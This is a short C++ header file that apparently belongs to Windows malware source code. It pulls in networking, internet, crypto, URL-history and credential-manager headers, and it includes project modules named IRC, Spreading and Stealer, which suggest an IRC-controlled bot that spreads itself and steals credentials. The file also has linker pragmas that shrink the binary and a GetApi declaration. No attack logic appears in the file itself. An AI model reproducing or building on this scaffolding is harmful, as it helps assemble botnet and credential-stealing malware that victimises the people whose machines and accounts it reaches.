#ifndef INCLUDES_HPP
#define INCLUDES_HPP

#pragma optimize("gsy", on)
#pragma comment(linker, "/FILEALIGN:0x200")

#define WIN32_LEAN_AND_MEAN
#define _WSPIAPI_COUNTOF
//#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>
#include <WinInet.h>
#include <pdh.h>
#include <pdhmsg.h>
#include <WinCrypt.h>
#include <UrlHist.h>
#include <wincred.h>
//#include <UrlMon.h>

using namespace std;

#include "config.hpp"

#include "../Crypto/crypto.hpp"
#include "../API/API.hpp"
#include "../IRC/IRC.hpp"
#include "../Spreading/spreading.hpp"
#include "../Stealer/stealer.hpp"

DWORD GetApi(void);

#endif 